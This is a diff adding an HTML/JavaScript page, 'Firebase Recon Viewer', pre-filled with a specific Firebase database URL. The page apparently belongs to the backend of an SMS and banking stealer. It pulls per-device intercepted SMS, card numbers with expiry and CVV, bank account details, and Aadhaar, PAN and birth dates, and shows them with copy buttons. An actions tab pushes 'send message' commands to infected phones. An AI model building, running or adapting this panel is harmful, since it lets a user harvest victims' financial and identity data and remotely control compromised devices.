@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Firebase Recon Viewer</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-base: #0a0e1a;
+            --bg-card: #111827;
+            --bg-card-hover: #1a2234;
+            --bg-surface: #0d1220;
+            --border: rgba(255,255,255,0.06);
+            --border-light: rgba(255,255,255,0.1);
+            --cyan: #00f0ff;
+            --cyan-dim: rgba(0,240,255,0.15);
+            --green: #00ff9d;
+            --red: #ef4444;
+            --amber: #ffab00;
+            --purple: #a855f7;
+            --pink: #ec4899;
+            --text: #e2e8f0;
+            --text-sec: #94a3b8;
+            --text-muted: #475569;
+            --font: 'Inter', sans-serif;
+            --font-mono: 'JetBrains Mono', monospace;
+            --radius: 12px;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { font-size: 15px; scrollbar-width: thin; scrollbar-color: var(--border) var(--bg-base); }
+        body { font-family: var(--font); background: var(--bg-base); color: var(--text); min-height: 100vh; }
+
+        ::-webkit-scrollbar { width: 5px; height: 5px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: var(--border-light); border-radius: 10px; }
+
+        /* ═══ HEADER ═══ */
+        .header {
+            background: linear-gradient(135deg, rgba(0,240,255,0.03), rgba(168,85,247,0.03));
+            border-bottom: 1px solid var(--border);
+            padding: 16px 28px;
+            display: flex; align-items: center; justify-content: space-between;
+            backdrop-filter: blur(20px);
+            position: sticky; top: 0; z-index: 100;
+        }
+        .header-left { display: flex; align-items: center; gap: 14px; }
+        .header-logo {
+            width: 40px; height: 40px; border-radius: 10px;
+            background: linear-gradient(135deg, var(--cyan), var(--purple));
+            display: flex; align-items: center; justify-content: center;
+            font-size: 1.2rem; font-weight: 900; color: #000;
+            box-shadow: 0 0 20px rgba(0,240,255,0.3);
+        }
+        .header-title { font-size: 1.3rem; font-weight: 800; letter-spacing: 0.5px; }
+        .header-title span { color: var(--cyan); }
+        .header-stats { display: flex; gap: 20px; }
+        .header-stat {
+            text-align: center; padding: 6px 16px;
+            background: rgba(255,255,255,0.03); border: 1px solid var(--border);
+            border-radius: 8px;
+        }
+        .header-stat .label { font-size: 0.6rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; font-weight: 700; }
+        .header-stat .value { font-size: 1.1rem; font-weight: 800; font-family: var(--font-mono); color: var(--cyan); }
+
+        /* ═══ CONNECTION BAR ═══ */
+        .connect-bar {
+            padding: 16px 28px; display: flex; gap: 12px; align-items: center;
+            background: rgba(0,0,0,0.3); border-bottom: 1px solid var(--border);
+        }
+        .connect-bar input {
+            flex: 1; padding: 10px 16px; background: var(--bg-card); border: 1px solid var(--border-light);
+            border-radius: 8px; color: var(--text); font-family: var(--font-mono); font-size: 0.85rem;
+            outline: none; transition: border-color 0.3s;
+        }
+        .connect-bar input:focus { border-color: var(--cyan); box-shadow: 0 0 0 3px var(--cyan-dim); }
+        .connect-bar input::placeholder { color: var(--text-muted); }
+        .btn {
+            padding: 10px 20px; border: none; border-radius: 8px; cursor: pointer;
+            font-family: var(--font); font-weight: 700; font-size: 0.85rem;
+            transition: all 0.2s; display: flex; align-items: center; gap: 6px;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, var(--cyan), #0090ff);
+            color: #000; box-shadow: 0 0 20px rgba(0,240,255,0.2);
+        }
+        .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 0 30px rgba(0,240,255,0.4); }
+
+        /* ═══ LAYOUT ═══ */
+        .layout { display: flex; height: calc(100vh - 120px); }
+
+        /* ═══ SIDEBAR ═══ */
+        .sidebar {
+            width: 340px; min-width: 280px; border-right: 1px solid var(--border);
+            display: flex; flex-direction: column; background: var(--bg-surface);
+        }
+        .sidebar-header {
+            padding: 14px 16px; border-bottom: 1px solid var(--border);
+            display: flex; align-items: center; justify-content: space-between;
+        }
+        .sidebar-header h3 { font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1.5px; font-weight: 800; }
+        .search-box { padding: 10px 12px; border-bottom: 1px solid var(--border); }
+        .search-box input {
+            width: 100%; padding: 9px 14px; background: rgba(255,255,255,0.04);
+            border: 1px solid var(--border); border-radius: 8px; color: var(--text);
+            font-family: var(--font); font-size: 0.85rem; outline: none; transition: all 0.3s;
+        }
+        .search-box input:focus { border-color: var(--cyan); box-shadow: 0 0 0 3px var(--cyan-dim); }
+        .search-box input::placeholder { color: var(--text-muted); }
+
+        .device-list { flex: 1; overflow-y: auto; }
+        .device-card {
+            padding: 12px 16px; border-bottom: 1px solid var(--border);
+            cursor: pointer; display: flex; align-items: center; gap: 12px;
+            transition: all 0.15s;
+        }
+        .device-card:hover { background: var(--bg-card-hover); }
+        .device-card.active { background: rgba(0,240,255,0.06); border-left: 3px solid var(--cyan); }
+        .device-icon {
+            width: 36px; height: 36px; border-radius: 8px;
+            background: rgba(0,240,255,0.08); border: 1px solid rgba(0,240,255,0.15);
+            display: flex; align-items: center; justify-content: center; font-size: 1.1rem;
+            flex-shrink: 0; position: relative;
+        }
+        .status-dot {
+            position: absolute; bottom: -2px; right: -2px;
+            width: 10px; height: 10px; border-radius: 50%;
+            border: 2px solid var(--bg-surface);
+        }
+        .status-dot.on { background: var(--green); box-shadow: 0 0 6px var(--green); }
+        .status-dot.off { background: var(--red); opacity: 0.6; }
+        .device-info { flex: 1; min-width: 0; }
+        .device-id { font-size: 0.8rem; font-family: var(--font-mono); font-weight: 600; color: var(--text); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .device-sub { font-size: 0.72rem; color: var(--text-sec); margin-top: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .device-batt { font-size: 0.75rem; font-weight: 700; font-family: var(--font-mono); }
+
+        /* ═══ MAIN CONTENT ═══ */
+        .main { flex: 1; overflow-y: auto; display: flex; flex-direction: column; }
+        .empty-state {
+            flex: 1; display: flex; flex-direction: column; align-items: center;
+            justify-content: center; color: var(--text-muted); gap: 12px;
+        }
+        .empty-state .icon { font-size: 3rem; opacity: 0.4; }
+        .empty-state .text { font-size: 0.9rem; font-weight: 600; }
+
+        /* ═══ TABS ═══ */
+        .tabs {
+            display: flex; border-bottom: 1px solid var(--border);
+            padding: 0 20px; background: rgba(0,0,0,0.2);
+        }
+        .tab {
+            padding: 12px 18px; cursor: pointer; font-size: 0.8rem; font-weight: 700;
+            color: var(--text-muted); border-bottom: 2px solid transparent;
+            transition: all 0.2s; text-transform: uppercase; letter-spacing: 0.8px;
+        }
+        .tab:hover { color: var(--text-sec); }
+        .tab.active { color: var(--cyan); border-bottom-color: var(--cyan); }
+
+        /* ═══ DETAIL PANEL ═══ */
+        .detail-panel { padding: 24px; flex: 1; overflow-y: auto; }
+        .detail-grid {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 24px;
+        }
+        .detail-card {
+            background: var(--bg-card); border: 1px solid var(--border);
+            border-radius: var(--radius); padding: 16px;
+        }
+        .detail-card .label {
+            font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase;
+            letter-spacing: 1px; font-weight: 800; margin-bottom: 6px;
+        }
+        .detail-card .value {
+            font-size: 1rem; font-weight: 700; color: var(--text);
+            font-family: var(--font-mono); word-break: break-all;
+        }
+        .detail-card.full { grid-column: 1 / -1; }
+        .detail-card.danger { border-color: rgba(239,68,68,0.2); background: rgba(239,68,68,0.04); }
+        .detail-card.danger .label { color: var(--red); }
+        .detail-card.warn { border-color: rgba(255,171,0,0.2); background: rgba(255,171,0,0.04); }
+        .detail-card.warn .label { color: var(--amber); }
+        .detail-card.info { border-color: rgba(0,240,255,0.15); background: rgba(0,240,255,0.03); }
+        .detail-card.info .label { color: var(--cyan); }
+
+        .section-title {
+            font-size: 1rem; font-weight: 800; color: #fff; margin-bottom: 16px;
+            display: flex; align-items: center; gap: 8px; padding-top: 8px;
+        }
+
+        /* ═══ FORMS ═══ */
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; font-size: 0.75rem; color: var(--text-sec); font-weight: 700; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .form-group input, .form-group select {
+            width: 100%; padding: 10px 14px; background: rgba(0,0,0,0.2);
+            border: 1px solid var(--border); border-radius: 8px; color: var(--text);
+            font-family: var(--font); font-size: 0.85rem; outline: none; transition: all 0.3s;
+        }
+        .form-group input:focus, .form-group select:focus { border-color: var(--cyan); box-shadow: 0 0 0 3px var(--cyan-dim); }
+
+        /* ═══ SMS LIST ═══ */
+        .sms-item {
+            background: var(--bg-card); border: 1px solid var(--border);
+            border-radius: var(--radius); padding: 14px 16px; margin-bottom: 10px;
+            transition: all 0.2s;
+        }
+        .sms-item:hover { border-color: var(--border-light); }
+        .sms-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+        .sms-sender { font-size: 0.8rem; font-weight: 700; color: var(--cyan); }
+        .sms-date { font-size: 0.7rem; color: var(--text-muted); font-family: var(--font-mono); }
+        .sms-sim { font-size: 0.65rem; color: var(--purple); font-weight: 700; background: rgba(168,85,247,0.1); padding: 2px 6px; border-radius: 4px; }
+        .sms-body { font-size: 0.85rem; color: var(--text-sec); line-height: 1.5; word-break: break-word; }
+
+        /* ═══ SPINNER ═══ */
+        .spinner {
+            width: 28px; height: 28px; border: 3px solid var(--border);
+            border-top-color: var(--cyan); border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
+
+        .loading-overlay {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(10,14,26,0.9); display: flex; flex-direction: column;
+            align-items: center; justify-content: center; z-index: 1000; gap: 16px;
+        }
+        .loading-overlay .text { color: var(--text-sec); font-weight: 600; font-size: 0.9rem; }
+
+        .copy-btn {
+            background: transparent; border: 1px solid var(--border); color: var(--text-muted);
+            padding: 2px 6px; border-radius: 4px; cursor: pointer; font-size: 0.7rem;
+            transition: all 0.2s; margin-left: 6px;
+        }
+        .copy-btn:hover { color: var(--cyan); border-color: var(--cyan); }
+
+        .badge {
+            display: inline-flex; align-items: center; gap: 4px;
+            padding: 3px 8px; border-radius: 6px; font-size: 0.7rem; font-weight: 700;
+        }
+        .badge-green { background: rgba(0,255,157,0.1); color: var(--green); border: 1px solid rgba(0,255,157,0.2); }
+        .badge-red { background: rgba(239,68,68,0.1); color: var(--red); border: 1px solid rgba(239,68,68,0.2); }
+        .badge-purple { background: rgba(168,85,247,0.1); color: var(--purple); border: 1px solid rgba(168,85,247,0.2); }
+
+        .sms-search { padding: 12px 20px; border-bottom: 1px solid var(--border); }
+        .sms-search input {
+            width: 100%; padding: 9px 14px; background: rgba(255,255,255,0.04);
+            border: 1px solid var(--border); border-radius: 8px; color: var(--text);
+            font-family: var(--font); font-size: 0.85rem; outline: none; transition: all 0.3s;
+        }
+        .sms-search input:focus { border-color: var(--cyan); box-shadow: 0 0 0 3px var(--cyan-dim); }
+        .sms-search input::placeholder { color: var(--text-muted); }
+
+        .raw-json {
+            background: #080c16; border: 1px solid var(--border); border-radius: 8px;
+            padding: 16px; font-family: var(--font-mono); font-size: 0.78rem;
+            color: var(--text-sec); white-space: pre-wrap; word-break: break-all;
+            max-height: 400px; overflow-y: auto; line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="header-left">
+            <div class="header-logo">🔥</div>
+            <div class="header-title">Firebase <span>Recon</span></div>
+        </div>
+        <div class="header-stats">
+            <div class="header-stat">
+                <div class="label">Devices</div>
+                <div class="value" id="statDevices">—</div>
+            </div>
+            <div class="header-stat">
+                <div class="label" style="color:var(--green)">● Online</div>
+                <div class="value" id="statOnline" style="color:var(--green)">—</div>
+            </div>
+            <div class="header-stat">
+                <div class="label">SMS</div>
+                <div class="value" id="statSms">—</div>
+            </div>
+            <div class="header-stat">
+                <div class="label">Cards</div>
+                <div class="value" id="statCards">—</div>
+            </div>
+            <div class="header-stat">
+                <div class="label">Accounts</div>
+                <div class="value" id="statAccounts">—</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="connect-bar">
+        <input type="text" id="fbUrl" placeholder="Firebase DB URL (e.g. https://xxxxx.firebaseio.com)" value="https://rahulpall-3a12b-default-rtdb.firebaseio.com">
+        <button class="btn btn-primary" onclick="connectFirebase()">⚡ Connect</button>
+    </div>
+
+    <div class="layout">
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <h3 id="devCount">Devices (0)</h3>
+            </div>
+            <div class="search-box">
+                <input type="text" id="searchBox" placeholder="Search device ID, phone, model..." oninput="filterAndRender()">
+            </div>
+            <div class="device-list" id="deviceList"></div>
+        </div>
+
+        <div class="main" id="mainPanel">
+            <div class="empty-state">
+                <div class="icon">📡</div>
+                <div class="text">Connect a Firebase URL to begin recon</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="loading-overlay" id="loader" style="display:none;">
+        <div class="spinner"></div>
+        <div class="text" id="loaderText">Connecting to Firebase...</div>
+    </div>
+
+<script>
+// ═══ STATE ═══
+let DB = {};
+let allDevices = [];
+let filteredDevices = [];
+let selectedDevice = null;
+let currentTab = 'info';
+
+function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+
+function copyText(text, btn) {
+    navigator.clipboard.writeText(text);
+    const orig = btn.textContent;
+    btn.textContent = '✓';
+    btn.style.color = 'var(--green)';
+    setTimeout(() => { btn.textContent = orig; btn.style.color = ''; }, 1200);
+}
+
+// ═══ CONNECT ═══
+async function connectFirebase() {
+    const base = document.getElementById('fbUrl').value.trim().replace(/\/+$/, '');
+    if (!base) return;
+
+    const loader = document.getElementById('loader');
+    const loaderText = document.getElementById('loaderText');
+    loader.style.display = 'flex';
+
+    try {
+        // Parallel fetch all nodes
+        loaderText.textContent = 'Fetching database nodes...';
+        const nodes = ['user_data', 'user_list', 'user_sms', 'Card', 'account', 'login', 'users', 'all_pas', 'sms_forward'];
+        const results = await Promise.all(nodes.map(async n => {
+            try {
+                const r = await fetch(`${base}/${n}.json`);
+                if (!r.ok) return null;
+                return await r.json();
+            } catch { return null; }
+        }));
+
+        DB = {};
+        nodes.forEach((n, i) => DB[n] = results[i]);
+
+        // Build device list from user_data
+        allDevices = [];
+        const userData = DB.user_data || {};
+        const userList = DB.user_list || {};
+
+        for (const [id, info] of Object.entries(userData)) {
+            if (!info || typeof info !== 'object') continue;
+            allDevices.push({
+                id,
+                status: info.status === 'online',
+                battery: info.battery ?? '—',
+                phone: info.phoneNumber || info.numberSim1 || 'Unknown',
+                sim1: info.numberSim1 || '',
+                sim1Name: info.nameSim1 || '',
+                sim2: info.numberSim2 || '',
+                sim2Name: info.nameSim2 || '',
+                sim1Type: info.typeSim1 || '',
+                sim2Type: info.typeSim2 || '',
+                model: info.d_name || info.Device_info?.split('\n')[0]?.replace('Model: ', '') || 'Unknown',
+                deviceInfo: info.Device_info || '',
+                installTime: info.installTime || '',
+                lastSeen: info.TimeandDate || '',
+                timestamp: info.timestamp || 0,
+                command: info.command || '',
+                messageText: info.messageText || '',
+                newUser: info.new_user || '',
+                simSlot: info.simSlot || '',
+                iccId1: info.iccIdSim1 || '',
+                iccId2: info.iccIdSim2 || '',
+                raw: info
+            });
+        }
+
+        // Also add devices from user_list that might not be in user_data
+        for (const [id, info] of Object.entries(userList)) {
+            if (!allDevices.find(d => d.id === id)) {
+                allDevices.push({
+                    id,
+                    status: false,
+                    battery: '—',
+                    phone: 'Unknown',
+                    sim1: '', sim1Name: '', sim2: '', sim2Name: '',
+                    sim1Type: '', sim2Type: '',
+                    model: info?.d_name || 'Unknown',
+                    deviceInfo: '', installTime: '', lastSeen: '',
+                    timestamp: 0,
+                    command: '', messageText: '', newUser: '',
+                    simSlot: '', iccId1: '', iccId2: '', raw: info
+                });
+            }
+        }
+
+        allDevices.sort((a, b) => (b.lastSeen || '').localeCompare(a.lastSeen || ''));
+
+        // Stats
+        const smsData = DB.user_sms || {};
+        let totalSms = 0;
+        for (const devId in smsData) {
+            if (smsData[devId] && typeof smsData[devId] === 'object') {
+                totalSms += Object.keys(smsData[devId]).length;
+            }
+        }
+
+        const onlineCount = allDevices.filter(d => d.status).length;
+        document.getElementById('statDevices').textContent = allDevices.length;
+        document.getElementById('statOnline').textContent = onlineCount;
+        document.getElementById('statSms').textContent = totalSms.toLocaleString();
+        document.getElementById('statCards').textContent = Object.keys(DB.Card || {}).length;
+        document.getElementById('statAccounts').textContent = Object.keys(DB.account || {}).length;
+
+        filterAndRender();
+        loader.style.display = 'none';
+
+    } catch (e) {
+        loaderText.textContent = `Connection failed: ${e.message}`;
+        setTimeout(() => loader.style.display = 'none', 3000);
+    }
+}
+
+// ═══ FILTER & RENDER DEVICE LIST ═══
+function filterAndRender() {
+    const q = (document.getElementById('searchBox').value || '').toLowerCase();
+    filteredDevices = allDevices.filter(d => {
+        if (!q) return true;
+        const str = `${d.id} ${d.phone} ${d.model} ${d.sim1} ${d.sim2}`.toLowerCase();
+        return str.includes(q);
+    });
+
+    document.getElementById('devCount').textContent = `Devices (${filteredDevices.length})`;
+
+    const html = filteredDevices.map(d => {
+        const active = selectedDevice && selectedDevice.id === d.id ? 'active' : '';
+        const bnum = parseInt(d.battery) || 0;
+        const bcol = bnum > 50 ? 'var(--green)' : bnum > 20 ? 'var(--amber)' : 'var(--red)';
+        return `
+        <div class="device-card ${active}" onclick="selectDevice('${d.id}')">
+            <div class="device-icon">📱
+                <div class="status-dot ${d.status ? 'on' : 'off'}"></div>
+            </div>
+            <div class="device-info">
+                <div class="device-id">${esc(d.id)}</div>
+                <div class="device-sub">${esc(d.phone)} · ${esc(d.model)}</div>
+            </div>
+            <div class="device-batt" style="color:${bcol}">${esc(String(d.battery))}%</div>
+        </div>`;
+    }).join('');
+
+    document.getElementById('deviceList').innerHTML = html || '<div class="empty-state" style="padding:40px;"><div class="text">No devices found</div></div>';
+}
+
+// ═══ SELECT DEVICE ═══
+function selectDevice(id) {
+    selectedDevice = allDevices.find(d => d.id === id);
+    currentTab = 'info';
+    filterAndRender();
+    renderDetail();
+}
+
+// ═══ SWITCH TAB ═══
+function switchTab(tab) {
+    currentTab = tab;
+    renderDetail();
+}
+
+// ═══ RENDER DETAIL ═══
+function renderDetail() {
+    const panel = document.getElementById('mainPanel');
+    if (!selectedDevice) {
+        panel.innerHTML = '<div class="empty-state"><div class="icon">📡</div><div class="text">Select a device to view details</div></div>';
+        return;
+    }
+
+    const d = selectedDevice;
+    const tabsHtml = `
+    <div class="tabs">
+        <div class="tab ${currentTab === 'info' ? 'active' : ''}" onclick="switchTab('info')">📱 Device</div>
+        <div class="tab ${currentTab === 'sms' ? 'active' : ''}" onclick="switchTab('sms')">💬 SMS</div>
+        <div class="tab ${currentTab === 'card' ? 'active' : ''}" onclick="switchTab('card')">💳 Card</div>
+        <div class="tab ${currentTab === 'account' ? 'active' : ''}" onclick="switchTab('account')">🏦 Account</div>
+        <div class="tab ${currentTab === 'login' ? 'active' : ''}" onclick="switchTab('login')">🔑 Login/KYC</div>
+        <div class="tab ${currentTab === 'actions' ? 'active' : ''}" onclick="switchTab('actions')">⚡ Actions</div>
+        <div class="tab ${currentTab === 'raw' ? 'active' : ''}" onclick="switchTab('raw')">{ } Raw</div>
+    </div>`;
+
+    let content = '';
+
+    if (currentTab === 'info') {
+        content = renderInfoTab(d);
+    } else if (currentTab === 'sms') {
+        content = renderSmsTab(d);
+    } else if (currentTab === 'card') {
+        content = renderCardTab(d);
+    } else if (currentTab === 'account') {
+        content = renderAccountTab(d);
+    } else if (currentTab === 'login') {
+        content = renderLoginTab(d);
+    } else if (currentTab === 'actions') {
+        content = renderActionsTab(d);
+    } else if (currentTab === 'raw') {
+        content = `<div class="detail-panel"><div class="section-title">📄 Raw JSON — /user_data/${esc(d.id)}</div><div class="raw-json">${esc(JSON.stringify(d.raw, null, 2))}</div></div>`;
+    }
+
+    panel.innerHTML = tabsHtml + content;
+}
+
+function renderInfoTab(d) {
+    return `
+    <div class="detail-panel">
+        <div class="section-title">📱 Device Information</div>
+        <div class="detail-grid">
+            <div class="detail-card info">
+                <div class="label">Device ID</div>
+                <div class="value">${esc(d.id)} <button class="copy-btn" onclick="copyText('${d.id}', this)">📋</button></div>
+            </div>
+            <div class="detail-card">
+                <div class="label">Status</div>
+                <div class="value"><span class="badge ${d.status ? 'badge-green' : 'badge-red'}">${d.status ? '● Online' : '● Offline'}</span></div>
+            </div>
+            <div class="detail-card">
+                <div class="label">Model</div>
+                <div class="value">${esc(d.model)}</div>
+            </div>
+            <div class="detail-card">
+                <div class="label">Battery</div>
+                <div class="value" style="color:${parseInt(d.battery)>50?'var(--green)':parseInt(d.battery)>20?'var(--amber)':'var(--red)'}">${esc(String(d.battery))}%</div>
+            </div>
+            <div class="detail-card">
+                <div class="label">Phone Number</div>
+                <div class="value">${esc(d.phone)} <button class="copy-btn" onclick="copyText('${d.phone}', this)">📋</button></div>
+            </div>
+            <div class="detail-card">
+                <div class="label">SIM 1</div>
+                <div class="value">${esc(d.sim1 || 'N/A')} ${d.sim1Name ? '<br><span style="font-size:0.75rem;color:var(--text-muted);font-weight:400;">' + esc(d.sim1Name) + '</span>' : ''} ${d.sim1Type ? '<br><span style="font-size:0.65rem;color:var(--purple);font-weight:600;">' + esc(d.sim1Type) + '</span>' : ''}</div>
+            </div>
+            <div class="detail-card">
+                <div class="label">SIM 2</div>
+                <div class="value">${esc(d.sim2 || 'N/A')} ${d.sim2Name ? '<br><span style="font-size:0.75rem;color:var(--text-muted);font-weight:400;">' + esc(d.sim2Name) + '</span>' : ''} ${d.sim2Type ? '<br><span style="font-size:0.65rem;color:var(--purple);font-weight:600;">' + esc(d.sim2Type) + '</span>' : ''}</div>
+            </div>
+            <div class="detail-card">
+                <div class="label">Install Time</div>
+                <div class="value">${esc(d.installTime || 'Unknown')}</div>
+            </div>
+            <div class="detail-card">
+                <div class="label">Last Seen</div>
+                <div class="value">${esc(d.lastSeen || 'Unknown')}</div>
+            </div>
+            <div class="detail-card">
+                <div class="label">Current Command</div>
+                <div class="value"><span class="badge badge-purple">${esc(d.command || 'none')}</span></div>
+            </div>
+            <div class="detail-card">
+                <div class="label">User Status</div>
+                <div class="value"><span class="badge ${d.newUser === 'old user' ? 'badge-green' : 'badge-red'}">${esc(d.newUser || 'Unknown')}</span></div>
+            </div>
+            ${d.deviceInfo ? `<div class="detail-card full"><div class="label">Full Device Info</div><div class="value" style="white-space:pre-wrap;font-size:0.8rem;">${esc(d.deviceInfo)}</div></div>` : ''}
+        </div>
+    </div>`;
+}
+
+function renderSmsTab(d) {
+    const smsData = DB.user_sms?.[d.id];
+    if (!smsData || typeof smsData !== 'object') {
+        return '<div class="detail-panel"><div class="empty-state" style="padding:60px;"><div class="icon">💬</div><div class="text">No SMS data for this device</div></div></div>';
+    }
+
+    const messages = Object.values(smsData).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+
+    return `
+    <div class="sms-search">
+        <input type="text" id="smsSearch" placeholder="Search messages..." oninput="filterSms()">
+    </div>
+    <div class="detail-panel" id="smsList">
+        <div class="section-title">💬 SMS Messages (${messages.length})</div>
+        ${messages.map(m => `
+        <div class="sms-item" data-search="${esc((m.body||'').toLowerCase())} ${esc((m.sender||'').toLowerCase())}">
+            <div class="sms-header">
+                <div style="display:flex;align-items:center;gap:8px;">
+                    <span class="sms-sender">${esc(m.sender || 'Unknown')}</span>
+                    <span class="sms-sim">${esc(m.sim_number || '')}</span>
+                </div>
+                <span class="sms-date">${esc(m.date || '')}</span>
+            </div>
+            <div class="sms-body">${esc(m.body || '')}</div>
+        </div>`).join('')}
+    </div>`;
+}
+
+function filterSms() {
+    const q = (document.getElementById('smsSearch')?.value || '').toLowerCase();
+    document.querySelectorAll('.sms-item').forEach(item => {
+        const search = item.getAttribute('data-search') || '';
+        item.style.display = !q || search.includes(q) ? '' : 'none';
+    });
+}
+
+function renderCardTab(d) {
+    const card = DB.Card?.[d.id];
+    if (!card) {
+        return '<div class="detail-panel"><div class="empty-state" style="padding:60px;"><div class="icon">💳</div><div class="text">No card data for this device</div></div></div>';
+    }
+    return `
+    <div class="detail-panel">
+        <div class="section-title">💳 Card Data</div>
+        <div class="detail-grid">
+            <div class="detail-card danger full">
+                <div class="label">Card Number</div>
+                <div class="value" style="font-size:1.3rem;letter-spacing:2px;">${esc(card.number || 'N/A')} <button class="copy-btn" onclick="copyText('${esc(card.number || '')}', this)">📋</button></div>
+            </div>
+            <div class="detail-card danger">
+                <div class="label">Expiry</div>
+                <div class="value">${esc(card.exp || 'N/A')}</div>
+            </div>
+            <div class="detail-card danger">
+                <div class="label">CVV</div>
+                <div class="value">${esc(card.cvv || 'N/A')}</div>
+            </div>
+        </div>
+    </div>`;
+}
+
+function renderAccountTab(d) {
+    const acct = DB.account?.[d.id];
+    if (!acct) {
+        return '<div class="detail-panel"><div class="empty-state" style="padding:60px;"><div class="icon">🏦</div><div class="text">No account data for this device</div></div></div>';
+    }
+    return `
+    <div class="detail-panel">
+        <div class="section-title">🏦 Bank Account Data</div>
+        <div class="detail-grid">
+            <div class="detail-card warn">
+                <div class="label">Account Number</div>
+                <div class="value">${esc(acct.account_number || 'N/A')} <button class="copy-btn" onclick="copyText('${esc(acct.account_number || '')}', this)">📋</button></div>
+            </div>
+            <div class="detail-card warn">
+                <div class="label">User ID</div>
+                <div class="value">${esc(acct.user_id || 'N/A')}</div>
+            </div>
+            <div class="detail-card warn full">
+                <div class="label">Account Holder</div>
+                <div class="value">${esc(acct.user_name || 'N/A')}</div>
+            </div>
+        </div>
+    </div>`;
+}
+
+function renderLoginTab(d) {
+    const login = DB.login?.[d.id];
+    if (!login) {
+        return '<div class="detail-panel"><div class="empty-state" style="padding:60px;"><div class="icon">🔑</div><div class="text">No login/KYC data for this device</div></div></div>';
+    }
+    return `
+    <div class="detail-panel">
+        <div class="section-title">🔑 Login / KYC Data</div>
+        <div class="detail-grid">
+            <div class="detail-card warn">
+                <div class="label">Name</div>
+                <div class="value">${esc(login.name || 'N/A')}</div>
+            </div>
+            <div class="detail-card warn">
+                <div class="label">Phone Number</div>
+                <div class="value">${esc(login.number || 'N/A')} <button class="copy-btn" onclick="copyText('${esc(login.number || '')}', this)">📋</button></div>
+            </div>
+            <div class="detail-card danger">
+                <div class="label">Aadhaar (Last 4)</div>
+                <div class="value">${esc(login.adhar || 'N/A')}</div>
+            </div>
+            <div class="detail-card danger">
+                <div class="label">PAN</div>
+                <div class="value">${esc(login.pan || 'N/A')}</div>
+            </div>
+            <div class="detail-card">
+                <div class="label">Date of Birth</div>
+                <div class="value">${esc((login.dob || 'N/A').trim())}</div>
+            </div>
+        </div>
+    </div>`;
+}
+
+function renderActionsTab(d) {
+    return `
+    <div class="detail-panel">
+        <div class="section-title">⚡ Remote Actions</div>
+        <div class="detail-card" style="max-width: 400px;">
+            <div style="font-size:1.1rem;font-weight:800;color:var(--cyan);margin-bottom:16px;display:flex;align-items:center;gap:8px;">
+                💬 Send SMS
+            </div>
+            <div class="form-group">
+                <label>Target Phone Number</label>
+                <input type="text" id="actionSmsPhone" placeholder="e.g. 9876543210">
+            </div>
+            <div class="form-group">
+                <label>Message Content</label>
+                <input type="text" id="actionSmsText" placeholder="Enter message...">
+            </div>
+            <div class="form-group">
+                <label>Select SIM Card</label>
+                <select id="actionSmsSim">
+                    <option value="0">SIM 1</option>
+                    <option value="1">SIM 2</option>
+                </select>
+            </div>
+            <button class="btn btn-primary" style="width:100%;justify-content:center;margin-top:8px;" onclick="sendSmsAction('${d.id}')">
+                Send SMS Command
+            </button>
+            <div id="actionStatus" style="margin-top:12px;font-size:0.8rem;font-weight:700;text-align:center;"></div>
+        </div>
+    </div>`;
+}
+
+async function sendSmsAction(deviceId) {
+    const base = document.getElementById('fbUrl').value.trim().replace(/\/+$/, '');
+    const phone = document.getElementById('actionSmsPhone').value.trim();
+    const text = document.getElementById('actionSmsText').value.trim();
+    const sim = document.getElementById('actionSmsSim').value;
+    const statusEl = document.getElementById('actionStatus');
+
+    if (!phone || !text) {
+        statusEl.style.color = 'var(--red)';
+        statusEl.textContent = 'Phone number and message are required.';
+        return;
+    }
+
+    const payload = {
+        command: "send message",
+        messageText: text,
+        phoneNumber: phone,
+        simSlot: sim
+    };
+
+    statusEl.style.color = 'var(--text-muted)';
+    statusEl.textContent = 'Sending command...';
+
+    try {
+        const res = await fetch(`${base}/user_data/${deviceId}.json`, {
+            method: 'PATCH',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        
+        if (res.ok) {
+            statusEl.style.color = 'var(--green)';
+            statusEl.textContent = '✓ SMS Command successfully pushed to Firebase!';
+            // Auto clear
+            setTimeout(() => {
+                document.getElementById('actionSmsText').value = '';
+                statusEl.textContent = '';
+            }, 3000);
+        } else {
+            throw new Error('HTTP ' + res.status);
+        }
+    } catch (e) {
+        statusEl.style.color = 'var(--red)';
+        statusEl.textContent = 'Failed to push command: ' + e.message;
+    }
+}
+</script>
+
+</body>
+</html>
